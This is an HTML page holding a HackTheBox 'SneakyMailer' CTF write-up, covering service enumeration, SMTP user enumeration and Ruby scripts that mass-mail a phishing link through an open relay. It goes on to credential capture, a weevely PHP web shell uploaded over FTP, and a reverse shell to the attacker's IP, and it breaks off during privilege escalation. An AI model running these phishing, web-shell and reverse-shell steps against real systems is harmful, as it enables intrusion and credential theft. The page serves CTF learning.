<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SneakyMailer | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="SneakyMailer HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/sneakymailer/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/sneakymailer/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="SneakyMailer "><meta property="og:description" content="SneakyMailer HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/sneakymailer/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/sneakymailer/sneakymailer.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-11-28T13:47:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/sneakymailer/sneakymailer.png"><meta name=twitter:title content="SneakyMailer "><meta name=twitter:description content="SneakyMailer HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"SneakyMailer ","item":"https://s4ch.github.io/writeups/hackthebox/sneakymailer/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SneakyMailer ","name":"SneakyMailer ","description":"SneakyMailer HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: SneakyMailer Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n1 $ pacman -S nmap ffuf lynx ruby ruby-nokogiri swaks pwncat evolution filezilla Network enumeration Port \u0026 service discovery with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 # Nmap 7.80 scan initiated Sun Nov 8 16:50:55 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.197 Nmap scan report for 10.10.10.197 Host is up (0.022s latency). Not shown: 65528 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA) | 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA) |_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp open http nginx 1.14.2 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.14.2 |_http-title: Did not follow redirect to http://sneakycorp.htb 143/tcp open imap Courier Imapd (released 2018) |_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS STARTTLS completed ACL CHILDREN UTF8=ACCEPTA0001 NAMESPACE OK QUOTA CAPABILITY | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Public Key type: rsa | Public Key bits: 3072 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-14T17:14:21 | Not valid after: 2021-05-14T17:14:21 | MD5: 3faf 4166 f274 83c5 8161 03ed f9c2 0308 |_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c |_ssl-date: TLS randomness does not represent time 993/tcp open ssl/imap Courier Imapd (released 2018) |_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS completed ACL CHILDREN UTF8=ACCEPTA0001 AUTH=PLAIN NAMESPACE OK QUOTA CAPABILITY | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Public Key type: rsa | Public Key bits: 3072 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-14T17:14:21 | Not valid after: 2021-05-14T17:14:21 | MD5: 3faf 4166 f274 83c5 8161 03ed f9c2 0308 |_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c |_ssl-date: TLS randomness does not represent time 8080/tcp open http nginx 1.14.2 | http-methods: |_ Supported Methods: GET HEAD |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: nginx/1.14.2 |_http-title: Welcome to nginx! Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Nov 8 16:51:55 2020 -- 1 IP address (1 host up) scanned in 60.40 seconds We can see there is a redirect from the web server on port 80 to http://sneakycorp.htb, so let’s add this local domain to /etc/hosts:\n1 2 $ cat /etc/hosts | grep sneak 10.10.10.197 sneakycorp.htb HTTP enumeration Let’s see if we can find links:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ lynx -dump -listonly -nonumbers http://sneakycorp.htb/ Visible links: http://sneakycorp.htb/index.php http://sneakycorp.htb/team.php http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ Hidden links: http://sneakycorp.htb/index.php http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/ http://sneakycorp.htb/#page-top Nothing useful, maybe the team page if we have a bruteforce to perform later.\nNow we can try to find some sub-domains:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ ffuf -u http://sneakycorp.htb/ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H 'Host: FUZZ.sneakycorp.htb' -ac /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://sneakycorp.htb/ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Header : Host: FUZZ.sneakycorp.htb :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: 185 :: Filter : Response words: 6 :: Filter : Response lines: 8 ________________________________________________ dev [Status: 200, Size: 13737, Words: 4007, Lines: 341] :: Progress: [38267/38267] :: Job [1/1] :: 1807 req/sec :: Duration: [0:00:22] :: Errors: 0 :: We can add dev.sneakycorp.htb to /etc/hosts:\n1 2 $ cat /etc/hosts | grep sneak 10.10.10.197 sneakycorp.htb dev.sneakycorp.htb The dev site looks the same but there is an additional page:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ lynx -dump -listonly -nonumbers http://dev.sneakycorp.htb/ Visible links: http://dev.sneakycorp.htb/index.php http://dev.sneakycorp.htb/team.php http://dev.sneakycorp.htb/pypi/register.php http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ Hidden links: http://dev.sneakycorp.htb/index.php http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/ http://dev.sneakycorp.htb/#page-top Let’s try to register an account at http://dev.sneakycorp.htb/pypi/register.php\nWe don’t know if it’s working or if it’s a rabbit hole and there is no login page anyway.\nService discovery The FTP is not accessible anonymously and we don’t have credentials yet.\nThere are a SMTP and IMAP server. This also another web server on port 8080 but found nothing while enumerating.\nSMTP \u0026 IMAP exploitation Let’s connect to the SMTP server and try to verify some email addresses:\n1 2 3 4 5 6 $ ncat sneakycorp.htb 25 220 debian ESMTP Postfix (Debian/GNU) vrfy cyfun@sneakymailer.htb 550 5.1.1 : Recipient address rejected: User unknown in virtual mailbox table vrfy airisatou@sneakymailer.htb 252 2.0.0 airisatou@sneakymailer.htb So it means our account was not created after filling the registration form but emails listed on the team page seem valid.\nI wrote a short ruby script to scrap \u0026 parse the website to extract the email addresses:\n1 2 3 4 5 6 7 8 9 10 11 #! /usr/bin/env ruby require 'nokogiri' require 'open-uri' doc = Nokogiri::HTML(URI.open('http://sneakycorp.htb/team.php')) cells = doc.search('table#dataTable tbody tr td') cells.each do |c| puts c.text if /@sneakymailer.htb/.match?(c) end 1 $ ruby grab_email.rb \u003e emails.txt If we want to verify all email addresses, we can re-use a Rubyfu - SMTP Enumeration script and modify it a bit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/usr/bin/env ruby require 'socket' users = File.read('emails.txt').split(\"\\n\") found = [] @s = TCPSocket.new('sneakycorp.htb', 25) @banner = @s.recv(1024).chomp users.each do |user| @s.send \"VRFY #{user} \\n\\r\", 0 resp = @s.recv(1024).chomp found \u003c\u003c user if resp.split[2] == user end @s.close puts \"[*] Result:-\" puts \"[+] Banner: \" + @banner puts \"[+] Found users: \\n#{found.join(\"\\n\")}\" In theory there is nmap script for that too but it didn’t work in my case:\n1 $ nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY},userdb=$(pwd)/emails.txt -p 25 sneakycorp.htb We can use another script to very available commands:\n1 2 3 4 5 6 7 8 9 10 $ nmap --script smtp-commands.nse -pT:25 sneakycorp.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:03 CET Nmap scan report for sneakycorp.htb (10.10.10.197) Host is up (0.022s latency). PORT STATE SERVICE 25/tcp open smtp |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds There is another script to check for open relay but it doesn’t work here (maybe because the anti-spam test target nmap.scanme.org by default).\n1 2 3 4 5 6 7 8 9 10 $ nmap --script smtp-open-relay.nse -p 25 sneakycorp.htb --script-args smtp-open-relay.to=tigernixon@sneakymailer.htb,smtp-open-relay.from=cyfun@sneakymailer.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:09 CET Nmap scan report for sneakycorp.htb (10.10.10.197) Host is up (0.023s latency). PORT STATE SERVICE 25/tcp open smtp |_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed Nmap done: 1 IP address (1 host up) scanned in 29.45 seconds Before going farther I checked we can’t read emails from the account we registered. The HackTricks - IMAP Syntax was useful for that.\n1 2 3 4 $ ncat sneakycorp.htb 143 * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc. See COPYING for distribution information. A1 LOGIN \"cyfun@sneakymailer.htb\" \"password\" A1 NO Login failed. I seems the SMTP server is vulnerable to open relay:\nAn SMTP server that works as an open relay, is a email server that does not verify if the user is authorised to send email from the specified email address. Therefore, users would be able to send email originating from any third-party email address that they want.\n1 2 3 4 5 6 7 8 9 10 11 $ ncat sneakycorp.htb 25 MA220 debian ESMTP Postfix (Debian/GNU) MAIL from:cyfun@sneakymailer.htb 250 2.1.0 Ok RCPT to:tigernixon@sneakymailer.htb 250 2.1.5 Ok DATA 354 End data with . hello open relay . 250 2.0.0 Ok: queued as 4773E25011 I wrote a script to abuse of SMTP open relay and send a test email to all users:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #!/usr/bin/env ruby require 'socket' users = File.read('emails.txt').split(\"\\n\") @s = TCPSocket.new('sneakycorp.htb', 25) @banner = @s.recv(1024).chomp users.each do |user| @s.send \"MAIL from:cyfun@sneakymailer.htb \\n\\r\", 0 @s.send \"RCPT to:#{user} \\n\\r\", 0 @s.send \"DATA \\n\\r\", 0 @s.send \"test \\r\\n.\\r\\n\", 0 resp = @s.recv(1024).chomp puts resp end @s.close puts \"[*] Result:-\" puts \"[+] Banner: \" + @banner Let’s change the email body content, replacing test by phishing content like a link to our web server and hope one of the users will click it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #!/usr/bin/env ruby require 'socket' users = File.read('emails.txt').split(\"\\n\") @s = TCPSocket.new('sneakycorp.htb', 25) @banner = @s.recv(1024).chomp users.each do |user| @s.send \"MAIL from:cyfun@sneakymailer.htb \\n\\r\", 0 @s.send \"RCPT to:#{user} \\n\\r\", 0 @s.send \"DATA \\n\\r\", 0 @s.send \"http://10.10.14.142:8080 \\r\\n.\\r\\n\", 0 resp = @s.recv(1024).chomp puts resp end @s.close puts \"[*] Result:-\" puts \"[+] Banner: \" + @banner Nice Paul felt into the trick:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ pwncat -l 8080 -vv INFO: Listening on :::8080 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:8080 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.197:52994 (family 2/IPv4, TCP) POST / HTTP/1.1 Host: 10.10.14.142:8080 User-Agent: python-requests/2.23.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Length: 185 Content-Type: application/x-www-form-urlencoded firstName=Paul\u0026lastName=Byrd\u0026email=paulbyrd%40sneakymailer.htb\u0026password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\u0026rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt Let’s URL decode the POST body:\n1 2 3 4 5 6 7 $ irb irb(main):001:0\u003e require 'cgi' =\u003e true irb(main):002:0\u003e puts CGI.unescape('firstName=Paul\u0026lastName=Byrd\u0026email=paulbyrd%40sneakymailer.htb\u0026password=%5E%28%23J %40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\u0026rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt') firstName=Paul\u0026lastName=Byrd\u0026email=paulbyrd@sneakymailer.htb\u0026password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht\u0026rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht =\u003e ni So here are our creds: paulbyrd@sneakymailer.htb / ^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht.\nIt seems that the username is not the full email address:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ncat sneakycorp.htb 143 * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc. See COPYING for distribution information. A1 LOGIN \"paulbyrd@sneakymailer.htb\" \"^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht\" A1 NO Login failed. ^C $ ncat sneakycorp.htb 143 * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc. See COPYING for distribution information. A1 LOGIN \"paulbyrd\" \"^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht\" * OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library) A1 OK LOGIN Ok. A1 LIST \"\" * * LIST (\\Unmarked \\HasChildren) \".\" \"INBOX\" * LIST (\\HasNoChildren) \".\" \"INBOX.Trash\" * LIST (\\HasNoChildren) \".\" \"INBOX.Sent\" * LIST (\\HasNoChildren) \".\" \"INBOX.Deleted Items\" * LIST (\\HasNoChildren) \".\" \"INBOX.Queue\" * LIST (\\HasNoChildren) \".\" \"INBOX.Sent Items\" * LIST (\\HasNoChildren) \".\" \"INBOX.Drafts\" A1 OK LIST completed I tried to connect to the IMAP server with Thunderbird and Kube but it wasn’t working but when I tried with Evolution it worked.\nBut it’s possible to continue via raw IMAP:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 A1 LIST \"INBOX.Sent Items\" * A1 OK LIST completed A1 SELECT \"INBOX.Sent Items\" * FLAGS (\\Draft \\Answered \\Flagged \\Deleted \\Seen \\Recent) * OK [PERMANENTFLAGS (\\* \\Draft \\Answered \\Flagged \\Deleted \\Seen)] Limited * 2 EXISTS * 0 RECENT * OK [UIDVALIDITY 589480766] Ok * OK [MYRIGHTS \"acdilrsw\"] ACL A1 OK [READ-WRITE] Ok A1 FETCH 2 all * 2 FETCH (FLAGS (\\Seen) INTERNALDATE \"23-Jun-2020 09:27:08 -0400\" RFC822.SIZE 585 ENVELOPE (\"Wed, 27 May 2020 13:28:58 -0400\" \"Module testing\" ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((NIL NIL \"low\" \"debian\")) NIL NIL NIL \"\u003c4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb\u003e\")) A1 OK FETCH completed. A1 FETCH 1 all * 1 FETCH (FLAGS (\\Seen) INTERNALDATE \"27-May-2020 13:43:07 -0400\" RFC822.SIZE 2167 ENVELOPE (\"Fri, 15 May 2020 13:03:37 -0500\" \"Password reset\" ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"Paul Byrd\" NIL \"paulbyrd\" \"sneakymailer.htb\")) ((\"root\" NIL \"root\" \"debian\")) NIL NIL NIL NIL)) A1 OK FETCH completed. A1 FETCH 2 body[text] * 2 FETCH (BODY[TEXT] {166} Hello low Your current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience. ) A1 OK FETCH completed. A1 FETCH 1 body[text] * 1 FETCH (BODY[TEXT] {1888} --_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_ Content-Transfer-Encoding: quoted-printable Content-Type: text/plain; charset=\"utf-8\" Hello administrator, I want to change this password for the developer accou= nt Username: developer Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C Please notify me when you do it=20 --_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_ Content-Transfer-Encoding: quoted-printable Content-Type: text/html; charset=\"utf-8\" \u003chtml xmlns:o=3D\"urn:schemas-microsoft-com:office:office\" xmlns:w=3D\"urn:sc= hemas-microsoft-com:office:word\" xmlns:m=3D\"http://schemas.microsoft.com/of= fice/2004/12/omml\" xmlns=3D\"http://www.w3.org/TR/REC-html40\"\u003e tp-equiv=3DContent-Type content=3D\"text/html; charset=3Dutf-8\"\u003e\u003cmeta name= =3DGenerator content=3D\"Microsoft Word 15 (filtered medium)\"\u003e\u003cstyle\u003e\u003c/style\u003e\u003c/head\u003e\u003cbody lang=3DEN-US link=3Dblue vlink=3D\"#954F72\"\u003e\u003cdiv cla= ss=3DWordSection1\u003e\u003cp class=3DMsoNormal\u003eHello administrator, I want to chang= e this password for the developer account\u003c/p\u003e\u003cp class=3DMsoNormal\u003e\u003co:p\u003e\u0026nbs= p;\u003c/o:p\u003e\u003c/p\u003e\u003cp class=3DMsoNormal\u003eUsername: developer\u003c/p\u003e\u003cp class=3DMsoNorma= l\u003eOriginal-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C\u003c/p\u003e\u003cp class=3DMsoNorm= al\u003e\u003co:p\u003e\u0026nbsp;\u003c/o:p\u003e\u003c/p\u003e\u003cp class=3DMsoNormal\u003ePlease notify me when you do i= t \u003c/p\u003e\u003c/div\u003e\u003c/body\u003e\u003c/html\u003e= --_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_-- ) A1 OK FETCH completed. Let’s try those creds: developer / m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C and then mess with pypi modules.\nFTP access The credentials are working on the FTP server:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ ftp sneakycorp.htb Connected to sneakycorp.htb. 220 (vsFTPd 3.0.3) Name (sneakycorp.htb:cyfun): developer 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxr-x 8 0 1001 4096 Nov 08 15:39 dev 226 Directory send OK. ftp\u003e ls dev 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 May 26 18:52 css drwxr-xr-x 2 0 0 4096 May 26 18:52 img -rwxr-xr-x 1 0 0 13742 Jun 23 08:44 index.php drwxr-xr-x 3 0 0 4096 May 26 18:52 js drwxr-xr-x 2 0 0 4096 May 26 18:52 pypi drwxr-xr-x 4 0 0 4096 May 26 18:52 scss -rwxr-xr-x 1 0 0 26523 May 26 19:58 team.php drwxr-xr-x 8 0 0 4096 May 26 18:52 vendor 226 Directory send OK. Before uploadign a PHP web shell, let’s craft one:\n1 2 $ weevely generate cyfun agent.php Generated 'agent.php' with password 'cyfun' of 744 byte size. Then let’s uplaod it:\n1 2 3 4 5 6 7 ftp\u003e cd dev 250 Directory successfully changed. ftp\u003e put agent.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 744 bytes sent in 6.3e-05 seconds (11.3 Mbytes/s) Then let’s connect to our webshell and use the backdoor_reversetcp module to get a reverse shell because the webshell is quickly removed from the server:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ weevely http://dev.sneakycorp.htb/agent.php cyfun [+] weevely 4.0.1 [+] Target: www-data@sneakymailer:/var/www/dev.sneakycorp.htb/dev [+] Session: /home/cyfun/.weevely/sessions/dev.sneakycorp.htb/agent_0.session [+] Shell: System shell [+] Browse the filesystem or execute commands starts the connection [+] to the target. Type :help for more information. weevely\u003e :backdoor_reversetcp 10.10.14.174 8080 Reverse shell connected, insert commands. Append semi-colon help to get the commands accepted. /bin/sh: 0: can't access tty; job control turned off $ id; uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation of Machine : from www-data to developer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin low:x:1000:1000:,,,:/home/low:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin postfix:x:108:116::/var/spool/postfix:/usr/sbin/nologin courier:x:109:118::/var/lib/courier:/usr/sbin/nologin vmail:x:5000:5000::/home/vmail:/usr/sbin/nologin developer:x:1001:1001:,,,:/var/www/dev.sneakycorp.htb:/bin/bash pypi:x:998:998::/var/www/pypi.sneakycorp.htb:/usr/sbin/nologin There are 2 users excluding roto that have a shell: low \u0026 developer.\nLet’s try the dev creds:\n1 2 3 4 5 $ su developer Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C id uid=1001(developer) gid=1001(developer) groups=1001(developer) But the home directory of developer is /var/www/dev.sneakycorp.htb the flag is not here.\nWe may look elsewhere.\nPrivilege Escalation of Machine : from developer to low 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ls -lh /home total 8.0K drwxr-xr-x 8 low low 4.0K Jun 8 03:47 low drwx------ 5 vmail vmail 4.0K May 19 21:10 vmail ls -lhA /home/low total 40K lrwxrwxrwx 1 root root 9 May 19 21:09 .bash_history -\u003e /dev/null -rw-r--r-- 1 low low 220 May 14 05:46 .bash_logout -rw-r--r-- 1 low low 3.5K May 14 05:46 .bashrc drwxr-xr-x 3 low low 4.0K May 16 03:34 .cache drwx------ 3 low low 4.0K May 14 13:21 .gnupg drwxr-xr-x 3 low low 4.0K May 16 03:37 .local dr-x------ 2 low low 4.0K May 16 03:30 .pip -rw-r--r-- 1 low low 807 May 14 05:46 .profile drwxr-xr-x 2 low low 4.0K Jun 8 03:47 .ssh -rwxr-x--- 1 root low 33 Nov 9 10:36 user.txt drwxr-xr-x 6 low low 4.0K May 16 03:33 venv We already saw 2 references to pypi, now there is a venv folder own by low and in /etc/passwd an account named pypi which has a home folder named /var/www/pypi.sneakycorp.htb.\nIt seems the pe will go through venv/pypi.\n1 2 3 4 5 ls -lhA 